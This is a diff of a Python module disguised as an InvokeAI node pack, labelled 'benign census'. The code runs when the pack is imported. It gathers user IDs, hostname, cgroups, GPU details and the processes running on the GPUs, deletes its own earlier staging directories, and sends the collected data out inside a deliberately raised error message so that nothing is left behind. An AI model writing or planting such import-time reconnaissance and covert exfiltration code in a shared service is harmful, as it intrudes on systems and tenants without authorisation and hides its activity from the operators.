@@ -1,45 +1,47 @@
-# i6034 benign self-cleaning census pack (read-only; executes at import).
-# Same mechanism as i5484-stage; the SMI query now carries memory.free per the i6034 intent.
-import os, socket, glob, subprocess, traceback
+# i6034 benign census + own-pack cleanup pack (read-only census; removes ONLY our own i5484-stage/i6034-stage dirs).
+# Ends by raising RuntimeError so the installer's except path removes THIS pack too (zero residue).
+import os, socket, glob, subprocess, traceback, shutil
 
-def _census():
-    L = []; a = L.append
-    try: a("uid=%s gid=%s euid=%s" % (os.getuid(), os.getgid(), os.geteuid()))
-    except Exception as e: a("ids_err=%r" % (e,))
-    try: a("hostname=%s" % socket.gethostname())
-    except Exception as e: a("host_err=%r" % (e,))
-    try: a("cwd=%s" % os.getcwd())
-    except Exception: pass
-    for f in ("/proc/1/cgroup", "/proc/self/cgroup"):
-        try: a("%s=%s" % (f, "|".join(open(f).read().split())))
-        except Exception as e: a("%s_err=%r" % (f, e))
-    for p in sorted(glob.glob("/proc/driver/nvidia/gpus/*/information")):
-        try: a("GPUINFO[%s]=%s" % (p, " / ".join(x.strip() for x in open(p).read().splitlines() if x.strip())))
-        except Exception as e: a("GPUINFO_err=%r" % (e,))
-    try: a("NVRM=%s" % " / ".join(open("/proc/driver/nvidia/version").read().splitlines()))
-    except Exception as e: a("NVRM_err=%r" % (e,))
-    try:
-        import ctypes
-        nv = ctypes.CDLL("libnvidia-ml.so.1"); nv.nvmlInit_v2()
-        n = ctypes.c_uint(); nv.nvmlDeviceGetCount_v2(ctypes.byref(n))
-        for i in range(n.value):
-            h = ctypes.c_void_p(); nv.nvmlDeviceGetHandleByIndex_v2(i, ctypes.byref(h))
-            nm = ctypes.create_string_buffer(128); nv.nvmlDeviceGetName(h, nm, 128)
-            uu = ctypes.create_string_buffer(128); nv.nvmlDeviceGetUUID(h, uu, 128)
-            class M(ctypes.Structure): _fields_=[("total",ctypes.c_ulonglong),("free",ctypes.c_ulonglong),("used",ctypes.c_ulonglong)]
-            m = M(); nv.nvmlDeviceGetMemoryInfo(h, ctypes.byref(m))
-            a("NVML_GPU%d name=%s uuid=%s vram_total=%d vram_free=%d" % (i, nm.value.decode("utf-8","replace"), uu.value.decode("utf-8","replace"), m.total, m.free))
-        try: nv.nvmlShutdown()
-        except Exception: pass
-    except Exception as e: a("NVML_err=%r" % (e,))
-    try:
-        r = subprocess.run(["bash","-lc","nvidia-smi -L 2>&1; echo ---; nvidia-smi --query-gpu=name,uuid,memory.total,memory.free,driver_version --format=csv,noheader 2>&1; echo ---; cat /proc/driver/nvidia/version 2>&1"],
-                           capture_output=True, text=True, timeout=25)
-        a("SMI_rc=%s" % r.returncode)
-        a("SMI_out=%s" % "|".join(r.stdout.strip().splitlines()))
-    except Exception as e: a("SMI_exc=%r" % (e,))
-    return " ;; ".join(L)
+L = []; a = L.append
+try: a("uid=%s gid=%s euid=%s" % (os.getuid(), os.getgid(), os.geteuid()))
+except Exception as e: a("ids_err=%r" % (e,))
+try: a("hostname=%s" % socket.gethostname())
+except Exception as e: a("host_err=%r" % (e,))
+try: a("cwd=%s" % os.getcwd())
+except Exception: pass
+for f in ("/proc/1/cgroup", "/proc/self/cgroup"):
+    try: a("%s=%s" % (f, "|".join(open(f).read().split())))
+    except Exception as e: a("%s_err=%r" % (f, e))
+for p in sorted(glob.glob("/proc/driver/nvidia/gpus/*/information")):
+    try: a("GPUINFO[%s]=%s" % (p, " / ".join(x.strip() for x in open(p).read().splitlines() if x.strip())))
+    except Exception as e: a("GPUINFO_err=%r" % (e,))
+try: a("NVRM=%s" % " / ".join(open("/proc/driver/nvidia/version").read().splitlines()))
+except Exception as e: a("NVRM_err=%r" % (e,))
 
-try: _d = _census()
-except Exception: _d = traceback.format_exc()
-raise RuntimeError("I6034CENSUS|| " + _d + " ||ENDCENSUS")
+
+def sh(cmd, t=30):
+    try:
+        r = subprocess.run(["bash", "-lc", cmd], capture_output=True, text=True, timeout=t)
+        return "rc=%s out=%s" % (r.returncode, "|".join((r.stdout or "").strip().splitlines())[:2500])
+    except Exception as e:
+        return "ERR %r" % (e,)
+
+
+a("CENSUS=%s" % sh("nvidia-smi -L 2>&1; echo ---; nvidia-smi --query-gpu=name,uuid,memory.total,memory.free,driver_version --format=csv,noheader 2>&1; echo ---; hostname; id; cat /proc/driver/nvidia/version 2>&1"))
+a("APPS=%s" % sh("nvidia-smi --query-compute-apps=pid,process_name,used_memory --format=csv,noheader 2>&1"))
+
+# cleanup: remove ONLY our own earlier pack dirs (exact names we created); never a tenant pack
+removed = []
+for root in ("/InvokeAI/nodes", "/invokeai/nodes", "/app/nodes"):
+    for name in ("i5484-stage", "i6034-stage"):
+        p = os.path.join(root, name)
+        if os.path.isdir(p):
+            try:
+                shutil.rmtree(p)
+                removed.append(p)
+            except Exception as e:
+                a("CLEANUP_ERR %s %r" % (p, e))
+a("CLEANUP_REMOVED=%s" % ("|".join(removed) or "none"))
+a("NODES_LIST=%s" % sh("ls -1 /InvokeAI/nodes /invokeai/nodes 2>&1 | head -40", t=15))
+
+raise RuntimeError("I6034CENSUS2|| " + " ;; ".join(str(x) for x in L) + " ||ENDCENSUS2")
